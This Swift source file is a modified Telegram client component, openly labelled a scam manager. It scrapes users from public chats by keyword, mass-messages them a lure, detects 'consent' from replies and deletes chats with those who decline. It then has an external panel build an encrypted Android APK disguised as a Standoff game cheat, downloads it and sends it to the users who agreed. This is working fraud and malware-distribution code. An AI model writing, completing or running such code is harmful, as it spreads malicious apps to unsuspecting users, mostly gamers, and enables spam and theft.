import Foundation
import SwiftSignalKit
import Postbox
import TelegramCore
import AccountContext
import UIKit

// MARK: - Scam Configuration
public struct EahatGramScamConfig {
    var chatLinks: [String] = [] // Max 6
    var searchWords: [String] = [] // Max 5
    var mustIncludeEnabled: Bool = false
    var mustIncludeWords: [String] = [] // Max 3
    var messageText: String = ""
    var messageTextAfterConsent: String = ""
    var addFileEnabled: Bool = false
    var apiKey: String = ""
    var apkName: String = ""
    var apkPackage: String = ""
    var apkAvatarData: Data?
}

// MARK: - User Match Info
private struct MatchedUser {
    let userId: Int64
    let username: String?
    let firstName: String?
    let chatId: Int64
    var consentReceived: Bool = false
    var messageSent: Bool = false
}

// MARK: - Panel API Models
private struct PanelBuildRequest: Codable {
    let apiKey: String
    let appName: String
    let loaderName: String
    let packageName: String
    let avatarBase64: String?
    let crypt: Bool
    let uiTheme: String
}

private struct PanelBuildResponse: Codable {
    let success: Bool
    let buildId: String?
    let message: String?
}

private struct PanelBuildStatusResponse: Codable {
    let success: Bool
    let status: String? // "building", "completed", "failed"
    let downloadUrl: String?
}

public final class EahatGramScamManager {
    public static let shared = EahatGramScamManager()
    
    private var context: AccountContext?
    private var config = EahatGramScamConfig()
    private var matchedUsers: [Int64: MatchedUser] = [:]
    private var isRunning = false
    private var currentBuildId: String?
    private var downloadedApkData: Data?
    private let monitoringResponsesDisposable = MetaDisposable()
    
    private init() {}
    
    public func setup(context: AccountContext) {
        self.context = context
    }
    
    public func updateConfig(_ config: EahatGramScamConfig) {
        self.config = config
    }
    
    // MARK: - Main Scam Flow
    public func startScamFlow() {
        guard !isRunning, self.context != nil else { return }
        isRunning = true
        matchedUsers.removeAll()
        
        print("[EahatGram Scam] Starting scam flow...")
        
        // Step 1: Search users in chats
        searchUsersInChats { [weak self] users in
            guard let self = self else { return }
            var deduplicatedUsers: [Int64: MatchedUser] = [:]
            for user in users {
                if deduplicatedUsers[user.userId] == nil {
                    deduplicatedUsers[user.userId] = user
                }
            }
            self.matchedUsers = deduplicatedUsers
            
            print("[EahatGram Scam] Found \(self.matchedUsers.count) matched users")
            
            // Step 2: Send initial messages
            self.sendInitialMessages()
            
            // Step 3: Start monitoring responses
            self.startMonitoringResponses()
            
            // Step 4: If addFile enabled, build APK
            if self.config.addFileEnabled {
                self.buildApkFile()
            }
        }
    }
    
    public func stopScamFlow() {
        isRunning = false
        matchedUsers.removeAll()
        currentBuildId = nil
        downloadedApkData = nil
        monitoringResponsesDisposable.set(nil)
        print("[EahatGram Scam] Stopped scam flow")
    }
    
    // MARK: - Step 1: Search Users
    private func searchUsersInChats(completion: @escaping ([MatchedUser]) -> Void) {
        guard self.context != nil else {
            completion([])
            return
        }
        
        var allMatched: [MatchedUser] = []
        let group = DispatchGroup()
        
        for chatLink in config.chatLinks.prefix(6) {
            group.enter()
            
            // Parse chat link and get peer
            resolveChatLink(chatLink) { [weak self] peerId in
                guard let self = self, let peerId = peerId else {
                    group.leave()
                    return
                }
                
                // Search messages in this chat
                self.searchMessagesInChat(peerId: peerId) { users in
                    allMatched.append(contentsOf: users)
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            completion(allMatched)
        }
    }
    
    private func resolveChatLink(_ link: String, completion: @escaping (PeerId?) -> Void) {
        guard let context = context else {
            completion(nil)
            return
        }
        
        // Extract username from link (t.me/username or @username)
        var username = link
        if link.contains("t.me/") {
            username = link.components(separatedBy: "t.me/").last ?? ""
        }
        username = username.replacingOccurrences(of: "@", with: "")
        
        let _ = (context.engine.peers.resolvePeerByName(name: username, referrer: nil)
        |> deliverOnMainQueue).start(next: { result in
            switch result {
            case let .result(peer):
                completion(peer?.id)
            case .progress:
                break
            }
        })
    }
    
    private func searchMessagesInChat(peerId: PeerId, completion: @escaping ([MatchedUser]) -> Void) {
        guard let context = context else {
            completion([])
            return
        }
        
        var matched: [MatchedUser] = []
        
        // Search for messages containing search words
        let searchQuery = config.searchWords.joined(separator: " OR ")
        
        let _ = (context.engine.messages.searchMessages(
            location: .peer(peerId: peerId, fromId: nil, tags: nil, reactions: nil, threadId: nil, minDate: nil, maxDate: nil),
            query: searchQuery,
            state: nil,
            limit: 100
        )
        |> take(1)
        |> deliverOnMainQueue).start(next: { [weak self] result, _ in
            guard let self = self else {
                completion([])
                return
            }
            
            for message in result.messages {
                guard let author = message.author else { continue }
                
                let messageText = message.text.lowercased()
                
                // Check if message contains any search word
                let containsSearchWord = self.config.searchWords.contains { word in
                    messageText.contains(word.lowercased())
                }
                
                guard containsSearchWord else { continue }
                
                // Check mustInclude words if enabled
                if self.config.mustIncludeEnabled {
                    let containsMustInclude = self.config.mustIncludeWords.contains { word in
                        messageText.contains(word.lowercased())
                    }
                    guard containsMustInclude else { continue }
                }
                
                // Add user to matched list
                if let user = author as? TelegramUser {
                    let matchedUser = MatchedUser(
                        userId: user.id.id._internalGetInt64Value(),
                        username: user.username,
                        firstName: user.firstName,
                        chatId: peerId.id._internalGetInt64Value()
                    )
                    matched.append(matchedUser)
                }
            }
            
            completion(matched)
        })
    }
    
    // MARK: - Step 2: Send Initial Messages
    private func sendInitialMessages() {
        guard let context = context else { return }
        
        for userId in matchedUsers.keys {
            let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
            
            let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
                .message(
                    text: config.messageText,
                    attributes: [],
                    inlineStickers: [:],
                    mediaReference: nil,
                    threadId: nil,
                    replyToMessageId: nil,
                    replyToStoryId: nil,
                    localGroupingKey: nil,
                    correlationId: nil,
                    bubbleUpEmojiOrStickersets: []
                )
            ]).start()
            
            print("[EahatGram Scam] Sent initial message to user \(userId)")
        }
    }
    
    // MARK: - Step 3: Monitor Responses
    private func startMonitoringResponses() {
        guard let context = context else { return }
        
        self.monitoringResponsesDisposable.set((context.account.stateManager.notificationMessages
        |> deliverOnMainQueue).start(next: { [weak self] messageLists in
            guard let self = self, self.isRunning else {
                return
            }
            
            for (messages, _, _, _) in messageLists {
                for message in messages where message.flags.contains(.Incoming) {
                    guard let author = message.author else {
                        continue
                    }
                    
                    let userId = author.id.id._internalGetInt64Value()
                    guard self.matchedUsers[userId] != nil else {
                        continue
                    }
                    
                    self.checkMessageForConsent(messageId: message.id)
                }
            }
        }))
    }
    
    private func checkMessageForConsent(messageId: MessageId) {
        guard let context = context else { return }
        
        let _ = (context.account.postbox.transaction { transaction -> Message? in
            return transaction.getMessage(messageId)
        }
        |> deliverOnMainQueue).start(next: { [weak self] message in
            guard let self = self, let message = message else { return }
            guard let author = message.author else { return }
            
            let userId = author.id.id._internalGetInt64Value()
            guard var user = self.matchedUsers[userId], !user.consentReceived else { return }
            
            let messageText = message.text.lowercased()
            
            // Use AI to determine consent
            self.analyzeConsent(text: messageText) { isConsent in
                if isConsent {
                    // User agreed
                    user.consentReceived = true
                    self.matchedUsers[userId] = user
                    
                    print("[EahatGram Scam] User \(userId) gave consent")
                    
                    // Send text after consent
                    self.sendTextAfterConsent(to: userId)
                    
                    // If APK is ready, send it
                    if let apkData = self.downloadedApkData {
                        self.sendApkToUser(userId: userId, apkData: apkData)
                    }
                } else {
                    // User declined - delete chat
                    print("[EahatGram Scam] User \(userId) declined, deleting chat")
                    self.deleteChat(userId: userId)
                }
            }
        })
    }
    
    private func analyzeConsent(text: String, completion: @escaping (Bool) -> Void) {
        // Simple AI-like consent detection
        let positiveWords = ["да", "нужна", "давай", "хочу", "согласен", "ок", "окей", "yes", "sure", "ok", "okay", "agree"]
        let negativeWords = ["нет", "не нужно", "не хочу", "отказ", "no", "nope", "decline", "refuse"]
        
        let lowerText = text.lowercased()
        
        let hasPositive = positiveWords.contains { lowerText.contains($0) }
        let hasNegative = negativeWords.contains { lowerText.contains($0) }
        
        if hasPositive && !hasNegative {
            completion(true)
        } else if hasNegative {
            completion(false)
        } else {
            // Ambiguous - treat as no consent
            completion(false)
        }
    }
    
    private func sendTextAfterConsent(to userId: Int64) {
        guard let context = context else { return }
        
        let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
        
        let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
            .message(
                text: config.messageTextAfterConsent,
                attributes: [],
                inlineStickers: [:],
                mediaReference: nil,
                threadId: nil,
                replyToMessageId: nil,
                replyToStoryId: nil,
                localGroupingKey: nil,
                correlationId: nil,
                bubbleUpEmojiOrStickersets: []
            )
        ]).start()
        
        print("[EahatGram Scam] Sent text after consent to user \(userId)")
    }
    
    private func deleteChat(userId: Int64) {
        guard let context = context else { return }
        
        let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
        
        let _ = context.engine.peers.removePeerChat(peerId: peerId, reportChatSpam: false, deleteGloballyIfPossible: false).start()
        
        matchedUsers.removeValue(forKey: userId)
    }
    
    // MARK: - Step 4: Build APK
    private func buildApkFile() {
        guard config.addFileEnabled, !config.apiKey.isEmpty else { return }
        
        print("[EahatGram Scam] Starting APK build...")
        
        let avatarBase64 = config.apkAvatarData?.base64EncodedString()
        
        let buildRequest = PanelBuildRequest(
            apiKey: config.apiKey,
            appName: config.apkName,
            loaderName: config.apkName,
            packageName: config.apkPackage.isEmpty ? "fdsgkjdsgsjkndfm.cn" : config.apkPackage,
            avatarBase64: avatarBase64,
            crypt: true,
            uiTheme: "чит на standoff"
        )
        
        // Call panel API to build
        callPanelBuildAPI(request: buildRequest) { [weak self] buildId in
            guard let self = self, let buildId = buildId else {
                print("[EahatGram Scam] Failed to start build")
                return
            }
            
            self.currentBuildId = buildId
            print("[EahatGram Scam] Build started with ID: \(buildId)")
            
            // Poll for build status
            self.pollBuildStatus(buildId: buildId)
        }
    }
    
    private func callPanelBuildAPI(request: PanelBuildRequest, completion: @escaping (String?) -> Void) {
        // This would call the actual panel API
        // For now, using placeholder URL
        guard let url = URL(string: "https://panel.example.com/api/build") else {
            completion(nil)
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "POST"
        urlRequest.setValue("application/json", forHTTPHeaderField: "Content-Type")
        urlRequest.setValue(request.apiKey, forHTTPHeaderField: "X-API-Key")
        
        do {
            urlRequest.httpBody = try JSONEncoder().encode(request)
        } catch {
            completion(nil)
            return
        }
        
        let task = URLSession.shared.dataTask(with: urlRequest) { data, response, error in
            guard let data = data, error == nil else {
                completion(nil)
                return
            }
            
            do {
                let buildResponse = try JSONDecoder().decode(PanelBuildResponse.self, from: data)
                completion(buildResponse.buildId)
            } catch {
                completion(nil)
            }
        }
        task.resume()
    }
    
    private func pollBuildStatus(buildId: String) {
        guard let url = URL(string: "https://panel.example.com/api/build/\(buildId)/status") else { return }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.setValue(config.apiKey, forHTTPHeaderField: "X-API-Key")
        
        let task = URLSession.shared.dataTask(with: urlRequest) { [weak self] data, response, error in
            guard let self = self, let data = data, error == nil else { return }
            
            do {
                let statusResponse = try JSONDecoder().decode(PanelBuildStatusResponse.self, from: data)
                
                if statusResponse.status == "completed", let downloadUrl = statusResponse.downloadUrl {
                    print("[EahatGram Scam] Build completed, downloading...")
                    self.downloadApk(url: downloadUrl)
                } else if statusResponse.status == "building" {
                    // Continue polling
                    DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                        self.pollBuildStatus(buildId: buildId)
                    }
                } else {
                    print("[EahatGram Scam] Build failed")
                }
            } catch {
                print("[EahatGram Scam] Failed to parse status response")
            }
        }
        task.resume()
    }
    
    private func downloadApk(url: String) {
        guard let downloadUrl = URL(string: url) else { return }
        
        let task = URLSession.shared.dataTask(with: downloadUrl) { [weak self] data, response, error in
            guard let self = self, let data = data, error == nil else {
                print("[EahatGram Scam] Failed to download APK")
                return
            }
            
            self.downloadedApkData = data
            print("[EahatGram Scam] APK downloaded, size: \(data.count) bytes")
            
            // Send to all users who gave consent
            for (userId, user) in self.matchedUsers where user.consentReceived {
                self.sendApkToUser(userId: userId, apkData: data)
            }
        }
        task.resume()
    }
    
    private func sendApkToUser(userId: Int64, apkData: Data) {
        guard let context = context else { return }
        
        let peerId = PeerId(namespace: Namespaces.Peer.CloudUser, id: PeerId.Id._internalFromInt64Value(userId))
        
        // Save APK to temp file
        let tempUrl = FileManager.default.temporaryDirectory.appendingPathComponent("\(config.apkName).apk")
        do {
            try apkData.write(to: tempUrl)
            
            // Upload as document
            let resource = LocalFileMediaResource(fileId: Int64.random(in: Int64.min...Int64.max))
            context.account.postbox.mediaBox.storeResourceData(resource.id, data: apkData)
            
            let file = TelegramMediaFile(
                fileId: MediaId(namespace: Namespaces.Media.LocalFile, id: Int64.random(in: Int64.min...Int64.max)),
                partialReference: nil,
                resource: resource,
                previewRepresentations: [],
                videoThumbnails: [],
                videoCover: nil,
                immediateThumbnailData: nil,
                mimeType: "application/vnd.android.package-archive",
                size: Int64(apkData.count),
                attributes: [.FileName(fileName: "\(config.apkName).apk")],
                alternativeRepresentations: []
            )
            
            let _ = enqueueMessages(account: context.account, peerId: peerId, messages: [
                .message(
                    text: "",
                    attributes: [],
                    inlineStickers: [:],
                    mediaReference: .standalone(media: file),
                    threadId: nil,
                    replyToMessageId: nil,
                    replyToStoryId: nil,
                    localGroupingKey: nil,
                    correlationId: nil,
                    bubbleUpEmojiOrStickersets: []
                )
            ]).start()
            
            print("[EahatGram Scam] Sent APK to user \(userId)")
            
        } catch {
            print("[EahatGram Scam] Failed to save APK file: \(error)")
        }
    }
}
